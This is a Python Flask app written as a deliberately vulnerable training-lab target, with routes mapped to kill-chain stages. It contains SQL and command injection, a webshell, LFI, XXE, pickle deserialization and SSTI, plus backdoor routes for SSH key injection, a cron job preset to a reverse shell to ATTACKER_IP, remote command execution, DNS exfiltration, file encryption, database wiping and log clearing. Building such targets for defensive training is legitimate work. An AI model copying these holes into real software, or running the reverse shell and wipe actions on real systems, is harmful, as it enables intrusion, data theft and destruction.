#!/usr/bin/env python3
"""bait-n-break vulnerable web app.

Intentionally vulnerable Flask app for an isolated training lab. Every
vulnerability here is deliberate and documented - do not "fix" these, and
never deploy this outside the lab's isolated network.

Vulnerability coverage (kill-chain mapped):
  Recon:      /admin, /files/<area>/, /env, /debug, /robots.txt
  InitAccess: /login (SQLi), SSH:2222, FTP:2121, MySQL:3306
  Execution:  /ping (CMDi), /upload (webshell), /read (LFI), /parse (XXE),
              /fetch (SSRF), /pickle (insecure deserialization)
  Pivot/PrivEsc: /docker (Docker socket), SUID find/awk/curl, sudo misconfig
  Persistence: /persist/ssh-key, /persist/cron
  Collection: /search (XSS), /comments (stored XSS), /users/<id> (IDOR),
              /files/<area>/<path> (bait file access)
  Exfil:      /exfil/dns, /exfil/http
  C2:         /c2/beacon
  Impact:     /admin/ransomware-demo, /admin/deface, /admin/wipe-db,
              /admin/clear-logs
"""
import base64
import os
import pickle
import sqlite3
import subprocess
import xml.etree.ElementTree as ET
from io import StringIO

from flask import Flask, request, render_template_string, send_from_directory, jsonify

app = Flask(__name__)
app.config["DEBUG"] = True

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
DB_PATH = os.path.join(BASE_DIR, "app.db")
LOG_FILE = os.path.join(BASE_DIR, "app.log")

BAIT_AREAS = {
    "backups": "/bait/backups",
    "secrets": "/bait/secrets",
    "deception": "/bait/deception",
}

os.makedirs(UPLOAD_DIR, exist_ok=True)


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute(
        "CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, ssn TEXT)"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, author TEXT, body TEXT)"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS employee_data (id INTEGER PRIMARY KEY, name TEXT, salary INTEGER, ssn TEXT, department TEXT)"
    )
    row = conn.execute("SELECT COUNT(*) AS n FROM users").fetchone()
    if row["n"] == 0:
        conn.execute("INSERT INTO users (username, password, role, ssn) VALUES (?, ?, ?, ?)",
                     ("admin", "admin123", "administrator", "123-45-6789"))
        conn.execute("INSERT INTO users (username, password, role, ssn) VALUES (?, ?, ?, ?)",
                     ("jdoe", "Password1!", "user", "987-65-4321"))
        conn.execute("INSERT INTO users (username, password, role, ssn) VALUES (?, ?, ?, ?)",
                     ("svc-backup", "B4ckup!2024", "service", "456-78-9012"))
        conn.execute("INSERT INTO users (username, password, role, ssn) VALUES (?, ?, ?, ?)",
                     ("root", "toor", "superadmin", "000-00-0000"))
        conn.execute("INSERT INTO employee_data (name, salary, ssn, department) VALUES (?, ?, ?, ?)",
                     ("Alice Admin", 120000, "123-45-6789", "Executive"))
        conn.execute("INSERT INTO employee_data (name, salary, ssn, department) VALUES (?, ?, ?, ?)",
                     ("Bob Builder", 85000, "234-56-7890", "Engineering"))
        conn.execute("INSERT INTO employee_data (name, salary, ssn, department) VALUES (?, ?, ?, ?)",
                     ("Carol Coder", 95000, "345-67-8901", "Engineering"))
        conn.execute("INSERT INTO employee_data (name, salary, ssn, department) VALUES (?, ?, ?, ?)",
                     ("Dave DBA", 110000, "456-78-9012", "Database"))
    conn.commit()
    conn.close()


@app.route("/")
def index():
    return "<h1>bait-n-break demo corp portal</h1><p><a href='/login'>Login</a> | <a href='/search'>Search</a> | <a href='/admin'>Admin</a></p>"


# --- Reconnaissance ---

@app.route("/admin")
def admin():
    links = "".join(f"<li><a href='/files/{area}/'>{area}</a></li>" for area in BAIT_AREAS)
    return f"<h1>Admin Panel</h1><p>debug={app.config['DEBUG']}</p><ul>{links}</ul><p><a href='/env'>Environment</a> | <a href='/debug'>Debug Console</a></p>"


@app.route("/robots.txt")
def robots():
    return """User-agent: *
Disallow: /admin
Disallow: /backups
Disallow: /secrets
Disallow: /files/
Disallow: /uploads/
Disallow: /shell/
Disallow: /.env
Disallow: /config.php
Disallow: /db_backup.sql
Allow: /""", 200, {"Content-Type": "text/plain"}


@app.route("/env")
def show_env():
    env_vars = {k: v for k, v in os.environ.items()}
    return jsonify(env_vars)


@app.route("/debug")
def debug_console():
    return f"""<h1>Debug Console</h1>
<pre>
Python: {os.sys.version}
CWD: {os.getcwd()}
UID: {os.getuid()}
Hostname: {os.uname().nodename}
DB Path: {DB_PATH}
Upload Dir: {UPLOAD_DIR}
</pre>"""


@app.route("/files/<area>/")
def list_files(area):
    directory = BAIT_AREAS.get(area)
    if directory is None or not os.path.isdir(directory):
        return "Not found", 404
    entries = os.listdir(directory)
    items = "".join(f"<li><a href='/files/{area}/{name}'>{name}</a></li>" for name in entries)
    return f"<h1>Index of {area}/</h1><ul>{items}</ul>"


@app.route("/files/<area>/<path:filename>")
def get_file(area, filename):
    directory = BAIT_AREAS.get(area)
    if directory is None:
        return "Not found", 404
    return send_from_directory(directory, filename)


# --- Initial Access: SQL injection ---

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return """
        <form method="post">
          <input name="username" placeholder="username">
          <input name="password" placeholder="password" type="password">
          <button type="submit">Login</button>
        </form>
        """
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    conn = get_db()
    try:
        row = conn.execute(query).fetchone()
    except sqlite3.Error as exc:
        return f"DB error: {exc}", 500
    finally:
        conn.close()
    if row:
        return f"<h1>Welcome, {row['username']}</h1><p>Role: {row['role']}</p>"
    return "<h1>Invalid credentials</h1>", 401


# --- Execution: command injection ---

@app.route("/ping")
def ping():
    host = request.args.get("host", "127.0.0.1")
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    return f"<pre>{result.stdout}\n{result.stderr}</pre>"


# --- Execution: unrestricted upload -> webshell ---

@app.route("/upload", methods=["GET", "POST"])
def upload():
    if request.method == "GET":
        return """
        <form method="post" enctype="multipart/form-data">
          <input type="file" name="file">
          <button type="submit">Upload</button>
        </form>
        """
    uploaded = request.files.get("file")
    if not uploaded or not uploaded.filename:
        return "No file", 400
    dest = os.path.join(UPLOAD_DIR, uploaded.filename)
    uploaded.save(dest)
    return f"Uploaded to /uploads/{uploaded.filename} - run it via /shell/{uploaded.filename}?cmd=..."


@app.route("/uploads/<path:filename>")
def get_upload(filename):
    return send_from_directory(UPLOAD_DIR, filename)


@app.route("/shell/<path:filename>")
def shell(filename):
    cmd = request.args.get("cmd", "")
    script_path = os.path.join(UPLOAD_DIR, filename)
    if not os.path.isfile(script_path):
        return "Not found", 404
    result = subprocess.run(f"bash {script_path} {cmd}", shell=True, capture_output=True, text=True)
    return f"<pre>{result.stdout}\n{result.stderr}</pre>"


# --- Execution: LFI (Local File Inclusion) ---

@app.route("/read")
def read_file():
    filename = request.args.get("file", "/etc/hostname")
    try:
        with open(filename, "r") as fh:
            content = fh.read()
        return f"<pre>{content}</pre>"
    except Exception as exc:
        return f"Error reading {filename}: {exc}", 500


# --- Execution: SSRF (Server-Side Request Forgery) ---

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not url:
        return "Usage: /fetch?url=http://internal-host/path", 400
    try:
        result = subprocess.run(f"curl -s '{url}'", shell=True, capture_output=True, text=True, timeout=10)
        return f"<pre>{result.stdout}\n{result.stderr}</pre>"
    except Exception as exc:
        return f"SSRF error: {exc}", 500


# --- Execution: XXE (XML External Entity) ---

@app.route("/parse", methods=["GET", "POST"])
def parse_xml():
    if request.method == "GET":
        return """
        <form method="post">
          <textarea name="xml" rows="8" cols="60">
&lt;?xml version="1.0"?&gt;
&lt;data&gt;&lt;name&gt;test&lt;/name&gt;&lt;/data&gt;
          </textarea>
          <br><button type="submit">Parse XML</button>
        </form>
        """
    xml_data = request.form.get("xml", "")
    try:
        parser = ET.XMLParser()
        tree = ET.fromstring(xml_data, parser=parser)
        result = ET.tostring(tree, encoding="unicode")
        return f"<pre>Parsed: {result}</pre>"
    except ET.ParseError as exc:
        return f"XML Parse Error: {exc}", 400
    except Exception as exc:
        return f"Error: {exc}", 500


# --- Execution: Insecure deserialization (pickle) ---

@app.route("/pickle", methods=["GET", "POST"])
def unpickle():
    if request.method == "GET":
        return """
        <h1>Pickle Deserializer</h1>
        <form method="post">
          <textarea name="data" rows="4" cols="60">gASVBQAAAAAAAAB9lCiMBG5hbWWUjAVhbGljZZSMBHJvbGWUjAVhZG1pbpR1Lg==</textarea>
          <br><button type="submit">Deserialize</button>
        </form>
        <p>Provide a base64-encoded pickle payload</p>
        """
    encoded = request.form.get("data", "")
    try:
        raw = base64.b64decode(encoded)
        obj = pickle.loads(raw)
        return f"<pre>Deserialized: {obj}</pre>"
    except Exception as exc:
        return f"Pickle error: {exc}", 500


# --- Privilege Escalation: IDOR ---

@app.route("/users/<int:user_id>")
def get_user(user_id):
    conn = get_db()
    try:
        row = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        if row:
            return jsonify(dict(row))
        return "User not found", 404
    finally:
        conn.close()


@app.route("/users")
def list_users():
    conn = get_db()
    try:
        rows = conn.execute("SELECT id, username, role FROM users").fetchall()
        return jsonify([dict(r) for r in rows])
    finally:
        conn.close()


@app.route("/employees")
def list_employees():
    conn = get_db()
    try:
        rows = conn.execute("SELECT * FROM employee_data").fetchall()
        return jsonify([dict(r) for r in rows])
    finally:
        conn.close()


# --- Privilege Escalation: Docker socket ---

@app.route("/docker")
def docker_ps():
    cmd = request.args.get("cmd", "ps")
    try:
        result = subprocess.run(f"docker {cmd}", shell=True, capture_output=True, text=True, timeout=30)
        return f"<pre>{result.stdout}\n{result.stderr}</pre>"
    except Exception as exc:
        return f"Docker error: {exc}", 500


# --- Persistence: SSH key injection ---

@app.route("/persist/ssh-key", methods=["GET", "POST"])
def persist_ssh_key():
    ssh_dir = "/home/victim/.ssh"
    auth_file = os.path.join(ssh_dir, "authorized_keys")
    if request.method == "GET":
        existing = ""
        try:
            with open(auth_file, "r") as fh:
                existing = fh.read()
        except Exception:
            existing = "(empty)"
        return f"""<h1>SSH Authorized Keys</h1>
<pre>{existing}</pre>
<form method="post">
  <textarea name="key" rows="4" cols="60" placeholder="ssh-rsa AAAAB3..."></textarea>
  <br><button type="submit">Add Key</button>
</form>"""
    key = request.form.get("key", "")
    if key:
        os.makedirs(ssh_dir, exist_ok=True)
        with open(auth_file, "a") as fh:
            fh.write(key + "\n")
        return "SSH key added successfully"
    return "No key provided", 400


# --- Persistence: cron job backdoor ---

@app.route("/persist/cron", methods=["GET", "POST"])
def persist_cron():
    CRON_FILE = "/tmp/backdoor_cron"
    if request.method == "GET":
        existing = ""
        try:
            with open(CRON_FILE, "r") as fh:
                existing = fh.read()
        except Exception:
            existing = "(no backdoor cron)"
        return f"""<h1>Cron Backdoor</h1>
<pre>{existing}</pre>
<form method="post">
  <input name="schedule" placeholder="*/5 * * * *" value="*/5 * * * *">
  <input name="command" placeholder="command" value="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'">
  <br><button type="submit">Install Cron Backdoor</button>
</form>"""
    schedule = request.form.get("schedule", "*/5 * * * *")
    command = request.form.get("command", "")
    if command:
        cron_line = f"{schedule} {command}\n"
        with open(CRON_FILE, "w") as fh:
            fh.write(cron_line)
        subprocess.run(f"crontab {CRON_FILE}", shell=True, capture_output=True)
        return f"Cron backdoor installed: {cron_line}"
    return "No command provided", 400


# --- Collection: XSS ---

@app.route("/search")
def search():
    q = request.args.get("q", "")
    return render_template_string(f"<h1>Results for: {q}</h1><p>No results found.</p>")


@app.route("/comments", methods=["GET", "POST"])
def comments():
    conn = get_db()
    if request.method == "POST":
        author = request.form.get("author", "anon")
        body = request.form.get("body", "")
        conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
        conn.commit()
    rows = conn.execute("SELECT author, body FROM comments").fetchall()
    conn.close()
    items = "".join(f"<li><b>{r['author']}</b>: {r['body']}</li>" for r in rows)
    form = """
    <form method="post">
      <input name="author" placeholder="name">
      <input name="body" placeholder="comment">
      <button type="submit">Post</button>
    </form>
    """
    return render_template_string(f"<h1>Comments</h1><ul>{items}</ul>{form}")


# --- Exfiltration: DNS tunneling simulation ---

@app.route("/exfil/dns")
def exfil_dns():
    data = request.args.get("data", "")
    if not data:
        return "Usage: /exfil/dns?data=HEXDATA", 400
    encoded = data.encode().hex()
    chunks = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]
    result = []
    for chunk in chunks:
        domain = f"{chunk}.exfil.bait-n-break.lab"
        try:
            subprocess.run(f"nslookup {domain} 2>/dev/null || host {domain} 2>/dev/null", shell=True, timeout=5)
        except Exception:
            pass
        result.append(f"exfiltrated chunk -> {domain}")
    return jsonify({"status": "exfiltrated", "chunks": len(chunks), "details": result})


@app.route("/exfil/http", methods=["POST"])
def exfil_http():
    data = request.form.get("data", "")
    if not data:
        data = request.get_data(as_text=True)
    with open(LOG_FILE, "a") as fh:
        fh.write(f"[EXFIL] {data}\n")
    return jsonify({"status": "data received"})


# --- C2 ---

@app.route("/c2/beacon", methods=["GET", "POST"])
def c2_beacon():
    task = request.args.get("task", "none")
    cmd = request.args.get("cmd", "")
    if cmd:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            return jsonify({"status": "executed", "output": result.stdout, "error": result.stderr})
        except Exception as exc:
            return jsonify({"status": "error", "error": str(exc)})
    return jsonify({"status": "ack", "task": task})


# --- Impact ---

@app.route("/admin/ransomware-demo", methods=["POST"])
def admin_ransomware_demo():
    target_dir = "/bait/deception/ransomware_target"
    os.makedirs(target_dir, exist_ok=True)
    key = b"lab-demo-key-not-secret"
    if not os.listdir(target_dir):
        with open(os.path.join(target_dir, "document_demo.txt"), "w") as fh:
            fh.write("dummy sensitive file (remote-triggered demo)\n")
    encrypted = 0
    for name in os.listdir(target_dir):
        path = os.path.join(target_dir, name)
        if not os.path.isfile(path) or name.endswith(".locked"):
            continue
        with open(path, "rb") as fh:
            data = fh.read()
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        with open(path + ".locked", "wb") as fh:
            fh.write(xored)
        os.remove(path)
        encrypted += 1
    with open(os.path.join(target_dir, "README_RESTORE.txt"), "w") as fh:
        fh.write(
            "This is a harmless training-lab demo. Files in this directory "
            "were encrypted with a fixed, known key for educational "
            "purposes only.\n"
        )
    return jsonify({"status": "ok", "files_encrypted": encrypted})


@app.route("/admin/deface", methods=["POST"])
def admin_deface():
    message = request.form.get("message", "HACKED by bait-n-break training lab")
    html = f"""<html>
<head><title>DEFACED</title></head>
<body style="background:black;color:red;text-align:center;padding-top:100px">
<h1>{message}</h1>
<p>This is a training lab defacement demo - no real damage done.</p>
</body></html>"""
    with open(os.path.join(BASE_DIR, "defaced.html"), "w") as fh:
        fh.write(html)
    return jsonify({"status": "defaced", "message": message})


@app.route("/admin/wipe-db", methods=["POST"])
def admin_wipe_db():
    conn = get_db()
    try:
        tables = ["users", "comments", "employee_data"]
        for t in tables:
            conn.execute(f"DROP TABLE IF EXISTS {t}")
        conn.commit()
        return jsonify({"status": "database wiped", "tables_dropped": tables})
    except Exception as exc:
        return jsonify({"status": "error", "error": str(exc)}), 500
    finally:
        conn.close()


@app.route("/admin/clear-logs", methods=["POST"])
def admin_clear_logs():
    log_files = [
        LOG_FILE,
        "/var/log/syslog",
        "/var/log/auth.log",
        "/tmp/backdoor_cron",
    ]
    cleared = []
    for f in log_files:
        try:
            open(f, "w").close()
            cleared.append(f)
        except Exception:
            pass
    return jsonify({"status": "logs cleared", "files": cleared})


if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
